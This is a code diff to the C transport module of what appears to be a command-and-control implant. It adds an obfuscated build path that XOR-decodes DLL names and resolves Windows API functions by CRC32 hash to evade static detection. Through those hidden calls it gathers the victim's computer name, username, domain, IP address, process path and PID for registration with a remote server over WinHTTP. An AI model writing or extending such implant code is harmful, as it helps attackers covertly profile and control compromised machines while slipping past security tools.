@@ -6,10 +6,8 @@
 #include "Utilities.h"
 #include "Defs.h"
 #include "Obfuscation.h"
-
 #include <iptypes.h>
 #include <iphlpapi.h>
-//#include <winternl.h>
 #include <winhttp.h>
 
 #define DATA_FREE( d, l ) \
@@ -54,18 +52,103 @@ BOOL TransportInit( ) {
     // Add session id
     PackageAddInt32( Package, Instance.Session.AgentID );
 
+#if CONFIG_OBFUSCATION
+    // Get Computer name
+    unsigned char s_kernel32[] = S_KERNEL32;
+    unsigned char s_advapi32[] = S_ADVAPI32;
+    unsigned char s_iphlpapi[] = S_IPHLPAPI;
+    unsigned char s_xkey[] = S_XK;
+    unsigned char d_kernel32[14] = {0};
+    unsigned char d_advapi32[14] = {0};
+    unsigned char d_iphlpapi[14] = {0};
+
+    xor_dec((char *)s_kernel32, sizeof(s_kernel32), (char *)s_xkey, sizeof(s_xkey));
+    mem_cpy(d_kernel32,s_kernel32,12);
+
+    xor_dec((char *)s_advapi32, sizeof(s_advapi32), (char *)s_xkey, sizeof(s_xkey));
+    mem_cpy(d_advapi32,s_advapi32,12);
+
+    xor_dec((char *)s_iphlpapi, sizeof(s_iphlpapi), (char *)s_xkey, sizeof(s_xkey));
+    mem_cpy(d_iphlpapi,s_iphlpapi,12);
+
+    HANDLE p_kernel32 = GetModuleHandle(d_kernel32);
+    HANDLE p_advapi32 = LoadLibrary(d_advapi32);
+    HANDLE p_iphlpapi = LoadLibrary(d_iphlpapi);
+
+    GetComputerNameExA_t p_GetComputerNameExA = (GetComputerNameExA_t) get_proc_address_by_hash(p_kernel32,GetComputerNameExA_CRC32B);
+    if ( ! p_GetComputerNameExA(ComputerNameNetBIOS, NULL, (LPDWORD) &Length) ) {
+        if ( ( Data = LocalAlloc( LPTR, Length ) ) )
+            p_GetComputerNameExA(ComputerNameNetBIOS, Data, (LPDWORD) &Length);
+    }
+
+    PackageAddBytes( Package, Data, Length );
+    DATA_FREE( Data, Length );
+
+    // Get Username
+    GetUserNameA_t p_GetUserNameA = (GetUserNameA_t) get_proc_address_by_hash(p_advapi32,GetUserNameA_CRC32B);
+
+    Length = MAX_PATH;
+    if ( ( Data = LocalAlloc( LPTR, Length ) ) ) {
+        p_GetUserNameA(Data, (LPDWORD) &Length);
+    }
+
+    PackageAddBytes( Package, Data, strlen( Data ) );
+    DATA_FREE( Data, Length );
+
+    // Get Domain
+    if ( ! p_GetComputerNameExA(ComputerNameDnsDomain, NULL, (LPDWORD) &Length) ) {
+        if ( ( Data = LocalAlloc( LPTR, Length ) ) )
+            p_GetComputerNameExA(ComputerNameDnsDomain, Data, (LPDWORD) &Length);
+    }
+    PackageAddBytes( Package, Data, Length );
+    DATA_FREE( Data, Length );
+
+    GetAdaptersInfo_t p_GetAdaptersInfo = (GetAdaptersInfo_t) get_proc_address_by_hash(p_iphlpapi,GetAdaptersInfo_CRC32B);
+
+    p_GetAdaptersInfo(NULL, (PULONG) &Length);
+    if ( ( Adapter = LocalAlloc( LPTR, Length ) ) ) {
+        if (p_GetAdaptersInfo(Adapter, (PULONG) &Length) == NO_ERROR ){
+            PackageAddBytes( Package, Adapter->IpAddressList.IpAddress.String, strlen( Adapter->IpAddressList.IpAddress.String ) );
+
+            mem_set( Adapter, 0, Length );
+            LocalFree( Adapter );
+            Adapter = NULL;
+        }
+        else
+            PackageAddInt32( Package, 0 );
+    }
+    else {
+        PackageAddInt32(Package, 0);
+    }
+
+    GetModuleFileNameA_t p_GetModuleFileNameA = (GetModuleFileNameA_t) get_proc_address_by_hash(p_kernel32,GetModuleFileNameA_CRC32B);
+
+    Length = MAX_PATH;
+    if ( ( Data = LocalAlloc( LPTR, Length ) ) )
+    {
+        Length = p_GetModuleFileNameA( NULL, Data, Length );
+        PackageAddBytes( Package, Data, Length );
+    } else {
+        PackageAddInt32( Package, 0 );
+    }
+
+    GetCurrentProcessId_t p_GetCurrentProcessId = (GetCurrentProcessId_t) get_proc_address_by_hash(p_kernel32,GetCurrentProcessId_CRC32B);
+    PackageAddInt32( Package, p_GetCurrentProcessId() );
+#else
     // Get Computer name
     if ( ! GetComputerNameExA(ComputerNameNetBIOS, NULL, (LPDWORD) &Length) ) {
         if ( ( Data = LocalAlloc( LPTR, Length ) ) )
             GetComputerNameExA(ComputerNameNetBIOS, Data, (LPDWORD) &Length);
     }
+
     PackageAddBytes( Package, Data, Length );
     DATA_FREE( Data, Length );
 
     // Get Username
     Length = MAX_PATH;
-    if ( ( Data = LocalAlloc( LPTR, Length ) ) )
+    if ( ( Data = LocalAlloc( LPTR, Length ) ) ) {
         GetUserNameA(Data, (LPDWORD) &Length);
+    }
 
     PackageAddBytes( Package, Data, strlen( Data ) );
     DATA_FREE( Data, Length );
@@ -90,18 +173,22 @@ BOOL TransportInit( ) {
         else
             PackageAddInt32( Package, 0 );
     }
-    else
-        PackageAddInt32( Package, 0 );
-
-
+    else {
+        PackageAddInt32(Package, 0);
+    }
     Length = MAX_PATH;
     if ( ( Data = LocalAlloc( LPTR, Length ) ) )
     {
         Length = GetModuleFileNameA( NULL, Data, Length );
         PackageAddBytes( Package, Data, Length );
-    } else PackageAddInt32( Package, 0 );
+    } else {
+        PackageAddInt32( Package, 0 );
+    }
 
     PackageAddInt32( Package, GetCurrentProcessId() );
+#endif
+
+
     PackageAddInt32( Package, 0 );
     PackageAddInt32( Package, PROCESS_AGENT_ARCH );
     PackageAddInt32( Package, FALSE ); // default
@@ -190,8 +277,9 @@ BOOL TransportSend( LPVOID Data, SIZE_T Size, PVOID* RecvData, PSIZE_T RecvSize 
     HttpEndpoint = L"index.php";
     HttpFlags    = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
 
-    if ( Instance.Config.Transport.Secure )
+    if ( Instance.Config.Transport.Secure ) {
         HttpFlags |= WINHTTP_FLAG_SECURE;
+    }
 
 #if CONFIG_OBFUSCATION
     WinHttpOpenRequest_t pWinHttpOpenRequest  = (WinHttpOpenRequest_t) get_proc_address_by_hash(GetModuleHandle(winhttp),WinHttpOpenRequest_CRC32B);
